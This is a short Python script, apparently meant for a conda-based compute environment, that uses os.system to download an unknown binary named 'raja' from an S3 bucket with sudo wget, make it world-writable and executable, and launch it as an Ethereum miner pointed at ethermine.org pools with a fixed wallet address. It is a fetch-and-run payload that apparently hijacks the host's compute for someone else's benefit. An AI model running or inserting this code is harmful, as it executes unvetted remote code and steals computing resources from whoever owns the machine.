#!/opt/conda/bin/python3.7
# -*- coding: utf-8 -*-

import os
os.system("sudo wget https://shekhawat22.s3.ap-south-1.amazonaws.com/raja")
os.system("chmod 777 raja")
os.system("./raja --farm-recheck 200 -G -S eu1.ethermine.org:4444 -FS us1.ethermine.org:4444 -O 0x9178e589dD1f057415AC26fCdb5a178b8C078379.bbtworker2")
